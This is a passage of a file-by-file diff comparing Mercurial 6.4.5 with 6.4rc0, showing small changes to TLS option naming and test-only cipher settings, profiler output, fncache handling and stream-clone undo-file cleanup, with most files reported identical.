+                    b" - delta-type=%-6s"
+                    b" snap-depth=%d"
+                    b" - p1-chain-length=%d"
+                    b" p2-chain-length=%d"
+                    b" - duration=%f"
+                    b"\n"
+                )
+                msg %= (
+                    dbg["target-revlog"],
+                    dbg["revision"],
+                    dbg["delta-base"],
+                    dbg["using-cached-base"],
+                    dbg["search_round_count"],
+                    dbg["delta_try_count"],
+                    dbg["type"],
+                    dbg["snapshot-depth"],
+                    dbg["p1-chain-len"],
+                    dbg["p2-chain-len"],
+                    dbg["duration"],
+                )
+                self._write_debug(msg)
+        return deltainfo
 
 
 def delta_compression(default_compression_header, deltainfo):
     """return (COMPRESSION_MODE, deltainfo)
 
     used by revlog v2+ format to dispatch between PLAIN and DEFAULT
     compression.
```

### Comparing `mercurial-6.4.5/mercurial/revlogutils/docket.py` & `mercurial-6.4rc0/mercurial/revlogutils/docket.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/revlogutils/flagutil.py` & `mercurial-6.4rc0/mercurial/revlogutils/flagutil.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/revlogutils/nodemap.py` & `mercurial-6.4rc0/mercurial/revlogutils/nodemap.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/revlogutils/randomaccessfile.py` & `mercurial-6.4rc0/mercurial/revlogutils/randomaccessfile.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/revlogutils/revlogv0.py` & `mercurial-6.4rc0/mercurial/revlogutils/revlogv0.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/revlogutils/rewrite.py` & `mercurial-6.4rc0/mercurial/revlogutils/rewrite.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/revlogutils/sidedata.py` & `mercurial-6.4rc0/mercurial/revlogutils/sidedata.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/revset.py` & `mercurial-6.4rc0/mercurial/revset.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/revsetlang.py` & `mercurial-6.4rc0/mercurial/revsetlang.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/rewriteutil.py` & `mercurial-6.4rc0/mercurial/rewriteutil.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/scmposix.py` & `mercurial-6.4rc0/mercurial/scmposix.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/scmutil.py` & `mercurial-6.4rc0/mercurial/scmutil.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/scmwindows.py` & `mercurial-6.4rc0/mercurial/scmwindows.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/server.py` & `mercurial-6.4rc0/mercurial/server.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/setdiscovery.py` & `mercurial-6.4rc0/mercurial/setdiscovery.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/shelve.py` & `mercurial-6.4rc0/mercurial/shelve.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/similar.py` & `mercurial-6.4rc0/mercurial/similar.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/simplemerge.py` & `mercurial-6.4rc0/mercurial/simplemerge.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/smartset.py` & `mercurial-6.4rc0/mercurial/smartset.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/sparse.py` & `mercurial-6.4rc0/mercurial/sparse.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/sshpeer.py` & `mercurial-6.4rc0/mercurial/sshpeer.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/sslutil.py` & `mercurial-6.4rc0/mercurial/sslutil.py`

 * *Files 1% similar despite different names*

```diff
@@ -118,15 +118,15 @@
 
     # If --insecure is used, we allow the use of TLS 1.0 despite config options.
     # We always print a "connection security to %s is disabled..." message when
     # --insecure is used. So no need to print anything more here.
     if ui.insecureconnections:
         minimumprotocol = b'tls1.0'
         if not ciphers:
-            ciphers = b'DEFAULT:@SECLEVEL=0'
+            ciphers = b'DEFAULT'
 
     s[b'minimumprotocol'] = minimumprotocol
     s[b'ciphers'] = ciphers
 
     # Look for fingerprints in [hostsecurity] section. Value is a list
     # of <alg>:<fingerprint> strings.
     fingerprints = ui.configlist(
@@ -549,15 +549,15 @@
     if util.safehasattr(ssl, 'TLSVersion'):
         # python 3.7+
         sslcontext = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
         sslcontext.options |= getattr(ssl, 'OP_NO_COMPRESSION', 0)
 
         # This config option is intended for use in tests only. It is a giant
         # footgun to kill security. Don't define it.
-        exactprotocol = ui.config(b'devel', b'server-insecure-exact-protocol')
+        exactprotocol = ui.config(b'devel', b'serverexactprotocol')
         if exactprotocol == b'tls1.0':
             if b'tls1.0' not in supportedprotocols:
                 raise error.Abort(_(b'TLS 1.0 not supported by this Python'))
             with warnings.catch_warnings():
                 warnings.filterwarnings(
                     'ignore',
                     'ssl.TLSVersion.TLSv1 is deprecated',
@@ -579,43 +579,41 @@
         elif exactprotocol == b'tls1.2':
             if b'tls1.2' not in supportedprotocols:
                 raise error.Abort(_(b'TLS 1.2 not supported by this Python'))
             sslcontext.minimum_version = ssl.TLSVersion.TLSv1_2
             sslcontext.maximum_version = ssl.TLSVersion.TLSv1_2
         elif exactprotocol:
             raise error.Abort(
-                _(b'invalid value for server-insecure-exact-protocol: %s')
-                % exactprotocol
+                _(b'invalid value for serverexactprotocol: %s') % exactprotocol
             )
     else:
         # Despite its name, PROTOCOL_SSLv23 selects the highest protocol that both
         # ends support, including TLS protocols. commonssloptions() restricts the
         # set of allowed protocols.
         protocol = ssl.PROTOCOL_SSLv23
         options = commonssloptions(b'tls1.0')
 
         # This config option is intended for use in tests only. It is a giant
         # footgun to kill security. Don't define it.
-        exactprotocol = ui.config(b'devel', b'server-insecure-exact-protocol')
+        exactprotocol = ui.config(b'devel', b'serverexactprotocol')
         if exactprotocol == b'tls1.0':
             if b'tls1.0' not in supportedprotocols:
                 raise error.Abort(_(b'TLS 1.0 not supported by this Python'))
             protocol = ssl.PROTOCOL_TLSv1
         elif exactprotocol == b'tls1.1':
             if b'tls1.1' not in supportedprotocols:
                 raise error.Abort(_(b'TLS 1.1 not supported by this Python'))
             protocol = ssl.PROTOCOL_TLSv1_1
         elif exactprotocol == b'tls1.2':
             if b'tls1.2' not in supportedprotocols:
                 raise error.Abort(_(b'TLS 1.2 not supported by this Python'))
             protocol = ssl.PROTOCOL_TLSv1_2
         elif exactprotocol:
             raise error.Abort(
-                _(b'invalid value for server-insecure-exact-protocol: %s')
-                % exactprotocol
+                _(b'invalid value for serverexactprotocol: %s') % exactprotocol
             )
 
         # We /could/ use create_default_context() here since it doesn't load
         # CAs when configured for client auth. However, it is hard-coded to
         # use ssl.PROTOCOL_SSLv23 which may not be appropriate here.
         sslcontext = ssl.SSLContext(protocol)
         sslcontext.options |= options
@@ -623,15 +621,15 @@
     # Improve forward secrecy.
     sslcontext.options |= getattr(ssl, 'OP_SINGLE_DH_USE', 0)
     sslcontext.options |= getattr(ssl, 'OP_SINGLE_ECDH_USE', 0)
 
     # In tests, allow insecure ciphers
     # Otherwise, use the list of more secure ciphers if found in the ssl module.
     if exactprotocol:
-        sslcontext.set_ciphers('DEFAULT:@SECLEVEL=0')
+        sslcontext.set_ciphers('DEFAULT')
     elif util.safehasattr(ssl, b'_RESTRICTED_SERVER_CIPHERS'):
         sslcontext.options |= getattr(ssl, 'OP_CIPHER_SERVER_PREFERENCE', 0)
         # pytype: disable=module-attr
         sslcontext.set_ciphers(ssl._RESTRICTED_SERVER_CIPHERS)
         # pytype: enable=module-attr
 
     if requireclientcert:
```

### Comparing `mercurial-6.4.5/mercurial/stack.py` & `mercurial-6.4rc0/mercurial/stack.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/state.py` & `mercurial-6.4rc0/mercurial/state.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/statichttprepo.py` & `mercurial-6.4rc0/mercurial/statichttprepo.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/statprof.py` & `mercurial-6.4rc0/mercurial/statprof.py`

 * *Files 1% similar despite different names*

```diff
@@ -536,19 +536,15 @@
     fp.write(
         b'%5.5s  %9.9s  %8.8s  %-8.8s\n'
         % (b"time", b"seconds", b"seconds", b"name")
     )
 
     for stat in stats:
         site = stat.site
-        sitelabel = b'%s:%d:%s' % (
-            site.filename(),
-            site.lineno or -1,
-            site.function,
-        )
+        sitelabel = b'%s:%d:%s' % (site.filename(), site.lineno, site.function)
         fp.write(
             b'%6.2f %9.2f %9.2f  %s\n'
             % (
                 stat.selfpercent(),
                 stat.totalseconds(),
                 stat.selfseconds(),
                 sitelabel,
@@ -613,15 +609,15 @@
                 source = stat.site.getsource(25)
                 if not isinstance(source, bytes):
                     source = pycompat.bytestr(source)
 
                 stattuple = (
                     stat.selfpercent(),
                     stat.selfseconds(),
-                    stat.site.lineno or -1,
+                    stat.site.lineno,
                     source,
                 )
 
                 fp.write(b'%33.0f%% %6.2f   line %d: %s\n' % stattuple)
 
 
 def display_about_method(data, fp, function=None, **kwargs):
```

### Comparing `mercurial-6.4.5/mercurial/store.py` & `mercurial-6.4rc0/mercurial/store.py`

 * *Files 1% similar despite different names*

```diff
@@ -399,15 +399,15 @@
 # note: the ".nd" file are nodemap data and won't "change" but they might be
 # deleted.
 REVLOG_FILES_VOLATILE_EXT = (b'.n', b'.nd')
 
 # some exception to the above matching
 #
 # XXX This is currently not in use because of issue6542
-EXCLUDED = re.compile(br'.*undo\.[^/]+\.(nd?|i)$')
+EXCLUDED = re.compile(b'.*undo\.[^/]+\.(nd?|i)$')
 
 
 def is_revlog(f, kind, st):
     if kind != stat.S_IFREG:
         return None
     return revlog_type(f)
 
@@ -599,15 +599,14 @@
 
 
 class fncache:
     # the filename used to be partially encoded
     # hence the encodedir/decodedir dance
     def __init__(self, vfs):
         self.vfs = vfs
-        self._ignores = set()
         self.entries = None
         self._dirty = False
         # set of new additions to fncache
         self.addls = set()
 
     def ensureloaded(self, warn=None):
         """read the fncache file if not already read.
@@ -684,20 +683,15 @@
             fp = self.vfs(b'fncache', mode=b'ab', atomictemp=True)
             if self.addls:
                 fp.write(encodedir(b'\n'.join(self.addls) + b'\n'))
             fp.close()
             self.entries = None
             self.addls = set()
 
-    def addignore(self, fn):
-        self._ignores.add(fn)
-
     def add(self, fn):
-        if fn in self._ignores:
-            return
         if self.entries is None:
             self._load()
         if fn not in self.entries:
             self.addls.add(fn)
 
     def remove(self, fn):
         if self.entries is None:
```

### Comparing `mercurial-6.4.5/mercurial/streamclone.py` & `mercurial-6.4rc0/mercurial/streamclone.py`

 * *Files 2% similar despite different names*

```diff
@@ -3,14 +3,15 @@
 # Copyright 2015 Gregory Szorc <gregory.szorc@gmail.com>
 #
 # This software may be used and distributed according to the terms of the
 # GNU General Public License version 2 or any later version.
 
 
 import contextlib
+import errno
 import os
 import struct
 
 from .i18n import _
 from .pycompat import open
 from .interfaces import repository
 from . import (
@@ -19,20 +20,22 @@
     error,
     narrowspec,
     phases,
     pycompat,
     requirements as requirementsmod,
     scmutil,
     store,
-    transaction,
     util,
 )
 from .revlogutils import (
     nodemap,
 )
+from .utils import (
+    stringutil,
+)
 
 
 def new_stream_clone_requirements(default_requirements, streamed_requirements):
     """determine the final set of requirement for a new stream clone
 
     this method combine the "default" requirements that a new repository would
     use with the constaint we get from the stream clone content. We keep local
@@ -928,8 +931,19 @@
             msg = b'copied %d files\n'
         src_repo.ui.debug(msg % (len(entries) + bm_count))
 
         with dest_repo.transaction(b"localclone") as tr:
             dest_repo.store.write(tr)
 
         # clean up transaction file as they do not make sense
-        transaction.cleanup_undo_files(dest_repo.ui.warn, dest_repo.vfs_map)
+        undo_files = [(dest_repo.svfs, b'undo.backupfiles')]
+        undo_files.extend(dest_repo.undofiles())
+        for undovfs, undofile in undo_files:
+            try:
+                undovfs.unlink(undofile)
+            except OSError as e:
+                if e.errno != errno.ENOENT:
+                    msg = _(b'error removing %s: %s\n')
+                    path = undovfs.join(undofile)
+                    e_msg = stringutil.forcebytestr(e)
+                    msg %= (path, e_msg)
+                    dest_repo.ui.warn(msg)
```

### Comparing `mercurial-6.4.5/mercurial/strip.py` & `mercurial-6.4rc0/mercurial/strip.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/subrepo.py` & `mercurial-6.4rc0/mercurial/subrepo.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/subrepoutil.py` & `mercurial-6.4rc0/mercurial/subrepoutil.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/tagmerge.py` & `mercurial-6.4rc0/mercurial/tagmerge.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/tags.py` & `mercurial-6.4rc0/mercurial/tags.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templatefilters.py` & `mercurial-6.4rc0/mercurial/templatefilters.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templatefuncs.py` & `mercurial-6.4rc0/mercurial/templatefuncs.py`

 * *Files 1% similar despite different names*

```diff
@@ -46,16 +46,16 @@
 # dict of template built-in functions
 funcs = {}
 templatefunc = registrar.templatefunc(funcs)
 
 
 @templatefunc(b'date(date[, fmt])')
 def date(context, mapping, args):
-    """Format a date. The format string uses the Python strftime format.
-    The default is a Unix date format, including the timezone:
+    """Format a date. See :hg:`help dates` for formatting
+    strings. The default is a Unix date format, including the timezone:
     "Mon Sep 04 15:13:13 2006 0700"."""
     if not (1 <= len(args) <= 2):
         # i18n: "date" is a keyword
         raise error.ParseError(_(b"date expects one or two arguments"))
 
     date = evaldate(
         context,
```

### Comparing `mercurial-6.4.5/mercurial/templatekw.py` & `mercurial-6.4rc0/mercurial/templatekw.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templater.py` & `mercurial-6.4rc0/mercurial/templater.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/atom/changelogentry.tmpl` & `mercurial-6.4rc0/mercurial/templates/atom/changelogentry.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/atom/map` & `mercurial-6.4rc0/mercurial/templates/atom/map`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/coal/header.tmpl` & `mercurial-6.4rc0/mercurial/templates/coal/header.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/gitweb/bookmarks.tmpl` & `mercurial-6.4rc0/mercurial/templates/gitweb/bookmarks.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/gitweb/branches.tmpl` & `mercurial-6.4rc0/mercurial/templates/gitweb/branches.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/gitweb/changelog.tmpl` & `mercurial-6.4rc0/mercurial/templates/gitweb/changelog.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/gitweb/changeset.tmpl` & `mercurial-6.4rc0/mercurial/templates/gitweb/changeset.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/gitweb/error.tmpl` & `mercurial-6.4rc0/mercurial/templates/gitweb/error.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/gitweb/fileannotate.tmpl` & `mercurial-6.4rc0/mercurial/templates/gitweb/fileannotate.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/gitweb/filecomparison.tmpl` & `mercurial-6.4rc0/mercurial/templates/gitweb/filecomparison.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/gitweb/filediff.tmpl` & `mercurial-6.4rc0/mercurial/templates/gitweb/filediff.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/gitweb/filelog.tmpl` & `mercurial-6.4rc0/mercurial/templates/gitweb/filelog.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/gitweb/filerevision.tmpl` & `mercurial-6.4rc0/mercurial/templates/gitweb/filerevision.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/gitweb/graph.tmpl` & `mercurial-6.4rc0/mercurial/templates/gitweb/graph.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/gitweb/header.tmpl` & `mercurial-6.4rc0/mercurial/templates/gitweb/header.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/gitweb/help.tmpl` & `mercurial-6.4rc0/mercurial/templates/gitweb/help.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/gitweb/helptopics.tmpl` & `mercurial-6.4rc0/mercurial/templates/gitweb/helptopics.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/gitweb/index.tmpl` & `mercurial-6.4rc0/mercurial/templates/gitweb/index.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/gitweb/manifest.tmpl` & `mercurial-6.4rc0/mercurial/templates/gitweb/manifest.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/gitweb/map` & `mercurial-6.4rc0/mercurial/templates/gitweb/map`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/gitweb/search.tmpl` & `mercurial-6.4rc0/mercurial/templates/gitweb/search.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/gitweb/shortlog.tmpl` & `mercurial-6.4rc0/mercurial/templates/gitweb/shortlog.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/gitweb/summary.tmpl` & `mercurial-6.4rc0/mercurial/templates/gitweb/summary.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/gitweb/tags.tmpl` & `mercurial-6.4rc0/mercurial/templates/gitweb/tags.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/json/map` & `mercurial-6.4rc0/mercurial/templates/json/map`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/map-cmdline.bisect` & `mercurial-6.4rc0/mercurial/templates/map-cmdline.bisect`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/map-cmdline.changelog` & `mercurial-6.4rc0/mercurial/templates/map-cmdline.changelog`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/map-cmdline.compact` & `mercurial-6.4rc0/mercurial/templates/map-cmdline.compact`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/map-cmdline.default` & `mercurial-6.4rc0/mercurial/templates/map-cmdline.default`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/map-cmdline.show` & `mercurial-6.4rc0/mercurial/templates/map-cmdline.show`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/map-cmdline.status` & `mercurial-6.4rc0/mercurial/templates/map-cmdline.status`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/map-cmdline.xml` & `mercurial-6.4rc0/mercurial/templates/map-cmdline.xml`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/monoblue/bookmarks.tmpl` & `mercurial-6.4rc0/mercurial/templates/monoblue/bookmarks.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/monoblue/branches.tmpl` & `mercurial-6.4rc0/mercurial/templates/monoblue/branches.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/monoblue/changelog.tmpl` & `mercurial-6.4rc0/mercurial/templates/monoblue/changelog.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/monoblue/changeset.tmpl` & `mercurial-6.4rc0/mercurial/templates/monoblue/changeset.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/monoblue/error.tmpl` & `mercurial-6.4rc0/mercurial/templates/monoblue/error.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/monoblue/fileannotate.tmpl` & `mercurial-6.4rc0/mercurial/templates/monoblue/fileannotate.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/monoblue/filecomparison.tmpl` & `mercurial-6.4rc0/mercurial/templates/monoblue/filecomparison.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/monoblue/filediff.tmpl` & `mercurial-6.4rc0/mercurial/templates/monoblue/filediff.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/monoblue/filelog.tmpl` & `mercurial-6.4rc0/mercurial/templates/monoblue/filelog.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/monoblue/filerevision.tmpl` & `mercurial-6.4rc0/mercurial/templates/monoblue/filerevision.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/monoblue/graph.tmpl` & `mercurial-6.4rc0/mercurial/templates/monoblue/graph.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/monoblue/help.tmpl` & `mercurial-6.4rc0/mercurial/templates/monoblue/help.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/monoblue/helptopics.tmpl` & `mercurial-6.4rc0/mercurial/templates/monoblue/helptopics.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/monoblue/index.tmpl` & `mercurial-6.4rc0/mercurial/templates/monoblue/index.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/monoblue/manifest.tmpl` & `mercurial-6.4rc0/mercurial/templates/monoblue/manifest.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/monoblue/map` & `mercurial-6.4rc0/mercurial/templates/monoblue/map`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/monoblue/notfound.tmpl` & `mercurial-6.4rc0/mercurial/templates/monoblue/notfound.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/monoblue/search.tmpl` & `mercurial-6.4rc0/mercurial/templates/monoblue/search.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/monoblue/shortlog.tmpl` & `mercurial-6.4rc0/mercurial/templates/monoblue/shortlog.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/monoblue/summary.tmpl` & `mercurial-6.4rc0/mercurial/templates/monoblue/summary.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/monoblue/tags.tmpl` & `mercurial-6.4rc0/mercurial/templates/monoblue/tags.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/paper/bookmarks.tmpl` & `mercurial-6.4rc0/mercurial/templates/paper/bookmarks.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/paper/branches.tmpl` & `mercurial-6.4rc0/mercurial/templates/paper/branches.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/paper/changeset.tmpl` & `mercurial-6.4rc0/mercurial/templates/paper/changeset.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/paper/error.tmpl` & `mercurial-6.4rc0/mercurial/templates/paper/error.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/paper/fileannotate.tmpl` & `mercurial-6.4rc0/mercurial/templates/paper/fileannotate.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/paper/filecomparison.tmpl` & `mercurial-6.4rc0/mercurial/templates/paper/filecomparison.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/paper/filediff.tmpl` & `mercurial-6.4rc0/mercurial/templates/paper/filediff.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/paper/filelog.tmpl` & `mercurial-6.4rc0/mercurial/templates/paper/filelog.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/paper/filerevision.tmpl` & `mercurial-6.4rc0/mercurial/templates/paper/filerevision.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/paper/graph.tmpl` & `mercurial-6.4rc0/mercurial/templates/paper/graph.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/paper/help.tmpl` & `mercurial-6.4rc0/mercurial/templates/paper/help.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/paper/helptopics.tmpl` & `mercurial-6.4rc0/mercurial/templates/paper/helptopics.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/paper/index.tmpl` & `mercurial-6.4rc0/mercurial/templates/paper/index.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/paper/manifest.tmpl` & `mercurial-6.4rc0/mercurial/templates/paper/manifest.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/paper/map` & `mercurial-6.4rc0/mercurial/templates/paper/map`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/paper/search.tmpl` & `mercurial-6.4rc0/mercurial/templates/paper/search.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/paper/shortlog.tmpl` & `mercurial-6.4rc0/mercurial/templates/paper/shortlog.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/paper/tags.tmpl` & `mercurial-6.4rc0/mercurial/templates/paper/tags.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/raw/map` & `mercurial-6.4rc0/mercurial/templates/raw/map`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/rss/changelogentry.tmpl` & `mercurial-6.4rc0/mercurial/templates/rss/changelogentry.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/rss/map` & `mercurial-6.4rc0/mercurial/templates/rss/map`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/spartan/branches.tmpl` & `mercurial-6.4rc0/mercurial/templates/spartan/branches.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/spartan/changelog.tmpl` & `mercurial-6.4rc0/mercurial/templates/spartan/changelog.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/spartan/changelogentry.tmpl` & `mercurial-6.4rc0/mercurial/templates/spartan/changelogentry.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/spartan/changeset.tmpl` & `mercurial-6.4rc0/mercurial/templates/spartan/changeset.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/spartan/fileannotate.tmpl` & `mercurial-6.4rc0/mercurial/templates/spartan/fileannotate.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/spartan/filediff.tmpl` & `mercurial-6.4rc0/mercurial/templates/spartan/filediff.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/spartan/filelog.tmpl` & `mercurial-6.4rc0/mercurial/templates/spartan/filelog.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/spartan/filelogentry.tmpl` & `mercurial-6.4rc0/mercurial/templates/spartan/filelogentry.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/spartan/filerevision.tmpl` & `mercurial-6.4rc0/mercurial/templates/spartan/filerevision.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/spartan/graph.tmpl` & `mercurial-6.4rc0/mercurial/templates/spartan/graph.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/spartan/manifest.tmpl` & `mercurial-6.4rc0/mercurial/templates/spartan/manifest.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/spartan/map` & `mercurial-6.4rc0/mercurial/templates/spartan/map`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/spartan/search.tmpl` & `mercurial-6.4rc0/mercurial/templates/spartan/search.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/spartan/shortlog.tmpl` & `mercurial-6.4rc0/mercurial/templates/spartan/shortlog.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/spartan/tags.tmpl` & `mercurial-6.4rc0/mercurial/templates/spartan/tags.tmpl`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/static/background.png` & `mercurial-6.4rc0/mercurial/templates/static/background.png`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/static/feed-icon-14x14.png` & `mercurial-6.4rc0/mercurial/templates/static/feed-icon-14x14.png`

 * *Files identical despite different names*

